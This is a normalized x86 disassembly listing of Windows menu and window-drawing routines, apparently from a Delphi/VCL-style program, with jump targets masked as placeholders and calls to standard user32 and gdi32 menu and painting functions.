mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_44c7e0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_44bb50
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403258
mov eax [ esi + 0x44 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_44bbc4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44bbc4
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_448308
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44ac4c
mov eax ebx
pop esi
pop ebx
retn
sub_44bc04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_44a848
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_44a858
call sub_44bc04
pop ecx
test al al
je r-xdata
sub_44bc9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_44bc04
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_448308
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_44bccc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_44bc9c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_44cff0
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_44bd3c
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_44bc9c
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_44bd58
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_44bc9c
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_44b408
mov ebx eax
xor edx edx
mov eax edi
call sub_44b904
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_44ad70
mov eax [ esi + 0x34 ]
call sub_44ad70
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_448cac
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_43f228
push eax
call DrawMenuBar
sub_44be44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_44be44
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_4036e0#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_44bc9c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_44ad70
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44be34
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_44bf98
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_422108
xor eax eax
push ebp
push sub_44c096
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422108
xor eax eax
push ebp
push sub_44c06b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_44be44
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422100
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c09d
mov eax [ rw-data ]
call sub_422100
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_44bc9c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_44c0bc
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_44c440
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_44c440
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_44c178
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_44c714
mov eax ebx
call sub_408354
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_44c218
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_44c178
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404200
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404450
lea edx [ ebp - 0x200 ]
call sub_408418
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_44c2ac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_44c31c
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c7bc
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44c7bc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44c7bc
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_44c328
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_44c218
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_44c2ac
mov eax ebx
call sub_44c7e0
jmp r-xdata
sub_44c390
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44c3d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_446608
mov eax ebx
call sub_44bbec
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44664c
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41921c
sub_44c414
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419468
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_44c3d8
sub_44c458
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44bc9c
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_44bc9c
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_44f74c
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_44c4b4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_44c589
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44bc9c
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44bc9c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_44a848
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44a858
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404178
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404178
mov eax [ ebp - 0xc ]
pop edx
call sub_407be4
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_44d300
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c590
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fb4
retn
sub_44c59c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44c458
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44c4b4
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_44c714
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_44be20
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_44bc9c
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_44bc9c
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4083f8
mov eax [ ebp + 0x10 ]
call sub_40833c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44c7e0
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_435920
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44c7bc
mov [ ebx + 0x41 ] 0x1
sub_44c808
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44c7bc
mov [ ebx + 0x41 ] 0x1
sub_44c894
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44c390
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_44c218
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_44c924
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_44c960
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036e0#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c9ac
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44cedf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cee6
lea eax [ ebp - 0x30 ]
call sub_403f90
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov edx [ esi + 0x4 ]
call sub_44bd58
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_458d5c
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov dx [ esi + 0x4 ]
call sub_44bd3c
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44cd12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44ccf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41d4b8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d358
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44d184
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ccfc
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d4b8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_44c59c
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_44bc9c
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44bc9c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_44ce55
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44ce30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44ce13
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41d4b8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d358
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ce1a
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d4b8
